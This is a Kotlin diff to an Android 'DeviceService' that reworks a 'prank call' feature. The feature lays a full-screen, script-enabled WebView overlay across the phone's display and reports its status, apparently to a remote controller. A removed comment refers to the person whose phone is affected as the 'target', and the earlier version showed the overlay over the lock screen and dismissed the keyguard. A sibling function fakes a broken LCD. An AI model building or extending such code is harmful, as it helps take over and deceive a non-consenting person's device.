@@ -1424,8 +1424,11 @@ private fun getLcdBrokenHtml(): String {
 
   
     
+
 private var prankCallOverlayView: android.webkit.WebView? = null
-private val prankCallWm: WindowManager by lazy { getSystemService(WINDOW_SERVICE) as WindowManager }
+private val prankCallWm: WindowManager by lazy {
+    getSystemService(WINDOW_SERVICE) as WindowManager
+}
 
 private fun setPrankCall(on: Boolean) {
     if (on) {
@@ -1435,35 +1438,50 @@ private fun setPrankCall(on: Boolean) {
 
         Handler(Looper.getMainLooper()).post {
             try {
-                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                else
-                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+                } else {
+                    @Suppress("DEPRECATION")
+                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+                }
 
                 val params = WindowManager.LayoutParams(
                     WindowManager.LayoutParams.MATCH_PARENT,
                     WindowManager.LayoutParams.MATCH_PARENT,
                     type,
-                    // FLAG_NOT_FOCUSABLE diubah agar interaksi tombol geser/angkat telepon di layar bisa diklik target
                     WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                     WindowManager.LayoutParams.FLAG_FULLSCREEN or
-                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                     PixelFormat.TRANSLUCENT
                 )
 
                 val wv = android.webkit.WebView(this@DeviceService).apply {
                     settings.javaScriptEnabled = true
                     settings.domStorageEnabled = true
-                    setBackgroundColor(android.graphics.Color.BLACK)
-                    loadDataWithBaseURL(null, html, "text/html", "UTF-8", null)
+
+                    setBackgroundColor(android.graphics.Color.TRANSPARENT)
+                    background = null
+
+                    isClickable = true
+                    isFocusable = true
+                    isFocusableInTouchMode = true
+
+                    loadDataWithBaseURL(
+                        null,
+                        html,
+                        "text/html",
+                        "UTF-8",
+                        null
+                    )
                 }
 
                 prankCallOverlayView = wv
                 prankCallWm.addView(wv, params)
 
-                emitStatus(JSONObject().apply { put("prankCallActive", true) })
+                emitStatus(JSONObject().apply {
+                    put("prankCallActive", true)
+                })
+
             } catch (e: Exception) {
                 Log.e("DeviceService", "setPrankCall on: ${e.message}")
             }
@@ -1471,13 +1489,23 @@ private fun setPrankCall(on: Boolean) {
     } else {
         Handler(Looper.getMainLooper()).post {
             prankCallOverlayView?.let {
-                try { prankCallWm.removeView(it) } catch (_: Exception) {}
+                try {
+                    prankCallWm.removeView(it)
+                    it.destroy()
+                } catch (e: Exception) {
+                    Log.e("DeviceService", "setPrankCall off: ${e.message}")
+                }
             }
+
             prankCallOverlayView = null
-            emitStatus(JSONObject().apply { put("prankCallActive", false) })
+
+            emitStatus(JSONObject().apply {
+                put("prankCallActive", false)
+            })
         }
     }
 }
+
 
 
 private fun getPrankCallHtml(): String {
